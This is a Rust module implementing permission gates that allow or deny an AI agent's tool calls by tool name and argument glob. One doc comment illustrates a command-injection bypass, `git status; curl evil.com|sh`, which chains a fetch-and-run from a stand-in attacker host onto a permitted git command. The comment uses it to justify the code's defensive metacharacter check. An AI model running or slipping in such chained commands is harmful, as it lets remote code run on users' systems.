//! Built-in [`conway_core::ports::PermissionGate`] implementations.
//!
//! Three gates cover the full space named in architecture §4.3:
//! [`AllowListGate`] (stateless allow/deny by tool name and argument glob),
//! [`DenyAllGate`] (always deny), and [`PromptingGate`] (delegate to an
//! embedder-supplied handler). [`from_config`] selects one from
//! [`crate::config::schema::PermissionsConfig`].
//!
//! All three are `Send + Sync + 'static` and hold no mutable state.

use std::sync::Arc;

use async_trait::async_trait;
use conway_core::agent::{PermissionDecision, PermissionRequest};
use conway_core::permission_pattern::contains_shell_metacharacters;
use conway_core::ports::{PermissionGate, RenderKind};
use globset::{Glob, GlobMatcher};

use crate::config::schema::{PermissionMode, PermissionsConfig};
use crate::error::{ConwayError, Result};

/// A boxed, `'static`, `Send` future — the return type a [`PromptingGate`]
/// handler must produce. Defined locally (rather than depending on the
/// `futures` crate) since this is the only place the shape is needed.
pub type BoxFuture<'a, T> = std::pin::Pin<Box<dyn std::future::Future<Output = T> + Send + 'a>>;

/// The handler a [`PromptingGate`] delegates every request to.
pub type PromptHandler =
    Arc<dyn Fn(PermissionRequest) -> BoxFuture<'static, PermissionDecision> + Send + Sync>;

/// How one allow/deny-list entry matches a tool call.
///
/// Parsed once at construction from the `tool_name` or `tool_name(pattern)`
/// string form, so `check` never re-parses or fails at request time.
enum ArgMatcher {
    /// A bare `tool_name` entry: matches any arguments.
    Any,
    /// A `tool_name(pattern)` entry whose pattern compiled to a valid glob.
    Glob(GlobMatcher),
    /// A `tool_name(pattern)` entry whose pattern was not a well-formed
    /// glob. `AllowListGate::new` cannot fail (see rustdoc below), so an
    /// unparsable pattern degrades to an exact (literal) string match
    /// against the matched value rather than being rejected or panicking.
    ///
    /// Only ever used for an *allowed* entry: an inert literal match keeps
    /// the entry fail-closed (it grants nothing beyond an implausible exact
    /// match). A *denied* entry with the same malformed pattern instead
    /// degrades to [`ArgMatcher::Any`] — see `Entry::parse` — because an
    /// inert deny would silently stop blocking the very call it named.
    Literal(String),
}

impl ArgMatcher {
    /// Raw glob/literal match, with no metacharacter gate. Used for
    /// **deny** entries only: mirroring [`conway_core::permission_pattern::
    /// PatternRule::matches_deny`], a deny match must stay hard to evade, so
    /// it deliberately matches identically regardless of what `value`
    /// contains.
    fn matches(&self, value: &str) -> bool {
        match self {
            ArgMatcher::Any => true,
            ArgMatcher::Glob(g) => g.is_match(value),
            ArgMatcher::Literal(pattern) => pattern == value,
        }
    }

    /// Whether this entry, used as an **allow** entry, authorizes `value`
    /// under `render_kind`.
    ///
    /// [`ArgMatcher::Any`] (a bare `tool_name` entry) is unconditional --
    /// `--allowed-tools bash` already grants unrestricted access, and gating
    /// it would reject every documented example for zero security gain.
    ///
    /// [`ArgMatcher::Glob`] (a `tool_name(pattern)` entry) additionally
    /// requires [`contains_shell_metacharacters`] to be false on `value`
    /// whenever `render_kind` is [`RenderKind::ShellCommand`] -- mirroring
    /// [`conway_core::permission_pattern::PatternRule::matches_render`]'s
    /// ordering exactly (the metacharacter check runs before, and gates,
    /// the pattern comparison). Without this, a scoped grant like
    /// `bash(git *)` -- read by an operator as "may run git commands" --
    /// silently also authorizes `git status; curl evil.com|sh`, because a
    /// raw `globset::Glob`'s `*` matches shell metacharacters too.
    fn allows(&self, value: &str, render_kind: RenderKind) -> bool {
        match self {
            ArgMatcher::Any => true,
            ArgMatcher::Glob(g) => {
                if render_kind == RenderKind::ShellCommand && contains_shell_metacharacters(value) {
                    return false;
                }
                g.is_match(value)
            }
            ArgMatcher::Literal(pattern) => pattern == value,
        }
    }
}

struct Entry {
    tool: String,
    matcher: ArgMatcher,
}

impl Entry {
    /// Parses one `allowed`/`denied` entry.
    ///
    /// `is_denied` selects the fallback used when `pattern` is not a
    /// well-formed glob: a denied entry falls back to [`ArgMatcher::Any`]
    /// (the deny fires unconditionally — deny always wins, so this stays
    /// safe) while an allowed entry falls back to [`ArgMatcher::Literal`]
    /// (the entry goes inert rather than granting anything unintended). See
    /// [`ArgMatcher::Literal`] for why the two roles cannot share a
    /// fallback. Either fallback emits a `tracing::warn` naming the tool and
    /// the malformed pattern, since a silently degraded rule should never be
    /// invisible to the embedder.
    fn parse(raw: &str, is_denied: bool) -> Self {
        if let Some(open) = raw.find('(') {
            if raw.ends_with(')') && open < raw.len() - 1 {
                let tool = raw[..open].to_string();
                let pattern = &raw[open + 1..raw.len() - 1];
                let matcher = Glob::new(pattern)
                    .map(|g| ArgMatcher::Glob(g.compile_matcher()))
                    .unwrap_or_else(|_| {
                        if is_denied {
                            tracing::warn!(
                                tool = %tool,
                                pattern = %pattern,
                                "malformed glob pattern in denied entry; falling back to \
                                 match-any so the deny still fires (fail closed)"
                            );
                            ArgMatcher::Any
                        } else {
                            tracing::warn!(
                                tool = %tool,
                                pattern = %pattern,
                                "malformed glob pattern in allowed entry; falling back to a \
                                 literal match, so this entry grants nothing (fail closed)"
                            );
                            ArgMatcher::Literal(pattern.to_string())
                        }
                    });
                return Entry { tool, matcher };
            }
        }
        Entry {
            tool: raw.to_string(),
            matcher: ArgMatcher::Any,
        }
    }
}

/// Extracts the string value an [`ArgMatcher`] pattern is matched against.
///
/// ASSUMPTION (module spec is silent on how a gate — which only sees a
/// [`PermissionRequest`], not the originating [`conway_core::content::ToolSpec`]
/// schema — identifies "the first schema property in declaration order"):
/// for a `bash`-shaped call the argument object carries a `command` string,
/// so that key is checked first; otherwise, an object with exactly one
/// string-valued entry uses that value. Any other shape (multiple keys, no
/// `command` key, non-string values) falls back to the compact JSON
/// serialization of the whole arguments value, so a pattern always has
/// something to match against.
///
/// CAVEAT for deny-list authors: a deny glob (`tool_name(pattern)`) is only
/// reliably matched against a tool whose primary argument is named
/// `command`, or whose arguments object has exactly one string-valued key.
/// Against any other shape — a multi-key, non-`command` tool in particular
/// — the pattern is matched against the whole-arguments JSON blob instead of
/// the argument you likely intend, so a glob written for that argument's
/// value will silently fail to match. For those tools, deny by **bare tool
/// name** (`tool_name`, which matches any arguments) rather than a glob.
fn matched_value(arguments: &serde_json::Value) -> String {
    if let serde_json::Value::Object(map) = arguments {
        if let Some(serde_json::Value::String(s)) = map.get("command") {
            return s.clone();
        }
        if map.len() == 1 {
            if let Some(serde_json::Value::String(s)) = map.values().next() {
                return s.clone();
            }
        }
    }
    serde_json::to_string(arguments).unwrap_or_default()
}

/// A stateless allow/deny-list gate: `AllowOnce` for a tool matched by an
/// `allowed` entry and not matched by any `denied` entry, `DenyWithFeedback`
/// otherwise.
///
/// Never returns `AllowAlways` — allow-list mode is stateless by design (a
/// one-shot `-p` invocation must never prompt or "remember" a decision).
/// `DenyWithFeedback` (not `Deny`) is used for every rejection so the model
/// can see and adapt to the denial in structured output.
///
/// See `matched_value` for a caveat on which tools a `denied` glob pattern
/// reliably matches against.
///
/// An **allowed** `tool_name(pattern)` entry never matches a value carrying
/// a shell metacharacter (`;`, `|`, `&`, backtick, ...) when the tool's own
/// `render_kind` is `ShellCommand` -- see `ArgMatcher::allows`. A **bare**
/// `tool_name` entry is unaffected: it already grants unrestricted access to
/// that tool, so there is nothing narrower for the metacharacter check to
/// protect.
pub struct AllowListGate {
    allowed: Vec<Entry>,
    denied: Vec<Entry>,
}

impl AllowListGate {
    /// Parses `allowed`/`denied` entries of the form `tool_name` or
    /// `tool_name(arg_glob)`.
    ///
    /// This constructor cannot fail: a malformed glob pattern degrades to a
    /// literal match on that exact pattern string (see `ArgMatcher::Literal`)
    /// rather than returning `Err` or panicking, so `allowed`/`denied` built
    /// from untrusted config never abort startup.
    pub fn new(allowed: Vec<String>, denied: Vec<String>) -> AllowListGate {
        AllowListGate {
            allowed: allowed.iter().map(|s| Entry::parse(s, false)).collect(),
            denied: denied.iter().map(|s| Entry::parse(s, true)).collect(),
        }
    }
}

#[async_trait]
impl PermissionGate for AllowListGate {
    async fn check(&self, req: PermissionRequest) -> PermissionDecision {
        let tool = req.tool.as_str();
        let value = matched_value(&req.arguments);

        let denied = self
            .denied
            .iter()
            .any(|e| e.tool == tool && e.matcher.matches(&value));
        if denied {
            return PermissionDecision::DenyWithFeedback {
                message: format!("tool '{tool}' is explicitly denied"),
            };
        }

        let allowed = self
            .allowed
            .iter()
            .any(|e| e.tool == tool && e.matcher.allows(&value, req.render_kind));
        if allowed {
            PermissionDecision::AllowOnce
        } else {
            PermissionDecision::DenyWithFeedback {
                message: format!("tool '{tool}' is not in the allow list"),
            }
        }
    }
}

/// A gate that denies every tool call, unconditionally.
pub struct DenyAllGate;

#[async_trait]
impl PermissionGate for DenyAllGate {
    async fn check(&self, _req: PermissionRequest) -> PermissionDecision {
        PermissionDecision::Deny {
            reason: "all tool use is denied by DenyAllGate".to_string(),
        }
    }
}

/// A gate that delegates every request to an embedder-supplied handler
/// unchanged — the built-in gate behind interactive (`prompt`) mode.
pub struct PromptingGate {
    handler: PromptHandler,
}

impl PromptingGate {
    pub fn new(handler: PromptHandler) -> Self {
        PromptingGate { handler }
    }
}

#[async_trait]
impl PermissionGate for PromptingGate {
    async fn check(&self, req: PermissionRequest) -> PermissionDecision {
        (self.handler)(req).await
    }
}

/// Builds the gate named by `config.mode`.
///
/// `mode = "prompt"` requires `prompt_handler` — there is no built-in
/// default interactive handler (that would require a UI dependency this
/// crate does not have), so its absence is a configuration error rather
/// than a silent fallback to allow or deny.
pub fn from_config(
    config: &PermissionsConfig,
    prompt_handler: Option<PromptHandler>,
) -> Result<Arc<dyn PermissionGate>> {
    match config.mode {
        PermissionMode::Allowlist => Ok(Arc::new(AllowListGate::new(
            config.allowed_tools.clone(),
            config.denied_tools.clone(),
        ))),
        PermissionMode::Deny => Ok(Arc::new(DenyAllGate)),
        PermissionMode::Prompt => {
            let handler = prompt_handler.ok_or_else(|| ConwayError::Config {
                path: None,
                message: "permissions.mode = \"prompt\" requires a prompt handler to be supplied"
                    .to_string(),
            })?;
            Ok(Arc::new(PromptingGate::new(handler)))
        }
    }
}
